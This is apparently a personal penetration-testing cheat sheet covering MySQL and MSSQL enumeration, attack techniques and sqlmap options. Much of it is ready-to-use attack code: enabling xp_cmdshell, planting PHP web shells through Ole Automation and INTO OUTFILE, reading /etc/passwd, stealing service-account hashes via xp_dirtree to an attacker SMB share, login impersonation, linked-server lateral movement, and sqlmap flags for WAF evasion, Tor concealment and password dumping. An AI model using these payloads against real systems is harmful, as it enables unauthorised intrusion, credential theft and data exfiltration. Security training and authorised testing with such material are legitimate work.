# SQL

## MySQL
__Command:__ ```mysql -u <user> -p<password> -h <target>```

When using Nmap to scan the server, use the ```--script mysql*``` option.

### Configuration
__Configuration file:__ /etc/mysql/mysql.conf.d/mysqld.cnf

__Dangerous settings:__
- ```user```:	Sets which user the MySQL service will run as.
- ```password```: Sets the password for the MySQL user.
- ```admin_address```: The IP address on which to listen for TCP/IP connections on the administrative network interface.
- ```debug```: Indicates the current debugging settings
- ```sql_warnings```: Controls whether single-row INSERT statements produce an information string if warnings occur. 
- ```secure_file_priv```: Limits the effect of data import and export operations.

The ```debug``` and ```sql_warnings``` settings in particular can contain sensitive information.


### Default databases
- ```mysql```: Stores information required by the MySQL server
- ```sys```: Contains tables, information and metadata necessary for management
- ```information_schema```: Contains metadata
- ```performance_schema```: Monitors MySQL server at a low level


## MSSQL
__MSSQLClient command:__ ```impacket-mssqlclient <user>@<target> -windows-auth```   
__sqsh command:__ ```sqsh -S <target> -U <user> -P <password> -h```

When scanning with Nmap, use these options: 
- ```--script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes```
- ```--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER```

### Default databases
- ```master```: Tracks all system information for an SQL server instance
- ```model```: Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database
- ```msdb```: The SQL Server Agent uses this database to schedule jobs & alerts
- ```tempdb```: Stores temporary objects
- ```resource```: Read-only database containing system objects included with SQL server

### Dangerous settings
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of named pipes
- Weak & default sa credentials. Admins may forget to disable this account


## Useful SQL commands
- ```show databases```: Show all databases
- ```use <database>```: Select a database
- ```show tables```: Show all available tables in database
- ```show columns from <table>```: Show all columns in selected table
- ```select * from <table>```: Show everything in selected table
- ```select * from <table> where <column> = <string>```: Search for a particular string in table

End all SQL commands with the ";" character.

## Attacks

### SQL Injection
Described in more detail in the Web Applications section.

### Command execution
System commands can be executed using __MSSQL__ if the ```xp_cmdshell``` feature is enabled.

Example of use:  
```xp_cmdshell <command>```   
```GO```

If ```xp_cmdshell``` is not enabled, it can be enabled with appropriate privileges using the following commands:

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

To write files using __MSSQL__, need to enable Ole Automation Procedures.

Commands for enabling Ole Automation Procedures:
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Commands for creating a file: 
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

Command for reading local file:
```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

Command execution in __MySQL__ can be achieved with the appropriate privileges by writing to a location in the file system that can execute commands.

Example (creating a reverse shell using PHP):
```SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';```

This write privilege is controlled by the global system variable ```secure_file_priv```, which can be set as follows:
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations

Command for reading a local file: ```select LOAD_FILE("/etc/passwd");```

### Hash stealing
In MSSQL, the service account hash can be stolen using ```xp_subdirs``` or ```xp_dirtree```. First, start __Responder__ or __impacket-smbserver__ and then execute one of the following commands:

Command using ```xp_dirtree```: 
```
1> EXEC master..xp_dirtree '\\<host>\<share>\'
2> GO
```

Command using ```xp_subdirs```:
```
1> EXEC master..xp_subdirs '\\<host>\<share>\'
2> GO
```

### Impersonating existing users
In __MSSQL__, a user can take on the permissions of another user or login using the ```IMPERSONATE``` permission.

Identifying users that can be impersonated:
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Checking current user and role:
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Impersonating user (run within the master database):
```
1> EXECUTE AS LOGIN = '<user>'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### Communicating with other databases
In MSSQL, servers can be linked to one another, creating the possibility of lateral movement between the servers.

Identifying linked servers:
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```

Identifying user used for connection and its privileges
```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<linked server IP>\SQLEXPRESS]
2> GO
```

Then execute queries using sysadmin privileges on the linked server.

## SQLMap
__Command:__ ```sqlmap <target options> <other options>```

### Target options
- ```-u <url>```: URL of target
- ```-d <string>```: Connection string for direct database connection
- ```-l <file>```: Parse target from proxy log file
- ```-m <file>```: FIle containing multiple URLs
- ```-c <file>```: Load options from configuration INI file
- ```-r <file>```: Load HTTP request from file

### Request options
- ```-A <user-agent>```: HTTP User-Agent header value
- ```-H <header>```: Extra header
- ```--method=<method>```: Specify HTTP method
- ```--data=<data>```: Data string to be sent though POST
- ```--cookie=<cookie>```: HTTP Cookie header value

### Enumerating database
- ```--banner```: Get database version banner
- ```--current-user```: Get current user name
- ```--current-db```: Get current database name
- ```--is-dba```: Check if current user has DBA (administrator) rights
- ```--tables```: Return table names
- ```--schema```: Get structure of all tables
- ```--search <-D/-T/-C> <keyword>```: Search for databases, tables and columns of interest

### Tuning attacks
- ```-p <parameter>```: Test particular parameter
- ```--prefix```: Add prefix to all injection vector values
- ```--suffix```: Add suffix to all injection vector values
- ```--level```: Extend vectors and boundaries being used based on expectancy of success
- ```--risk```: Extend vectors based on risk of causing problems at the target side
- ```--union-cols=<number>```: Specify number of columns of vulnerable SQL query in the case of UNION type attacks not working
- ```--union-char='<char>'```: Specify alternate value for default "dummy" filling values used by SQLmap, in teh case of UNION type attacks not working
- ```--technique=<technique>```: Specify SQLi technique to use
- ```--where=<condition>```: Specify WHERE condition (e.g. ```name LIKE 'f%'```)

### Bypassing web application protections
- ```--csrf-token=<token name>```: Bypass anti-CSRF protection using token in request data
- ```--randomize=<parameter>```: Bypass requirement for unique values to be provided
- ```--eval=<python code>```: Bypass requirement for a paramater value to be a calculation (e.g. hash of another parameter), with Python code for calculation as the input value
- ```--proxy=<proxy address>```: Conceal IP address using a working proxy
- ```--tor```: Conceal IP address using Tor
- ```--check-tor```: Check that Tor is beign used correctly
- ```--random-agent```: Changes default SQLMap agent to randomly chosen value
- ```--tamper```: Python scripts which modify requests before they are sent to the target, to bypass some kind of protection
- ```--chunked```: Splits POST request body into 'chunks', allowing blacklisted SQL keywords to be split between them and abel to pass through unnoticed

### OS exploitation
- ```--file-read <file>```: Read local file
- ```--file-write <fiel>```: File to write data from (on attacking machine)
- ```--file-dest <file>```: File to write data to (on target machine)
- ```--os-shell```: Get reverse shell
- ```--technique=<SQL injection type>```: Specify technique to use for better chance of direct output

### Other options
- ```--batch```: Use defaults without asking for user input
- ```--dump```: Dump all data from current database
- ```--dump-all```: Dump data from all databases
- ```-D <database>```: Dump data from specified database
- ```-T <table>```: Dump data from specified table
- ```-C <column>```: Dump data from specified column/s
- ```--passwords```: Dump passwords
- ```--start```: Specify number of entry to start from
- ```--stop```: Specify number of entry to stop at
- ```--parse-errors```: Parse and display DBMS errors
- ```-t <file>```: Store traffic to output file
- ```--proxy```: Redirect traffic through proxy

### SQL injection types
- ```B```: Boolean-based blind
- ```E```: Error-based
- ```U```: Union query-based
- ```S```: Stacked queries
- ```T```: Time-based blind
- ```Q```: Inline queries
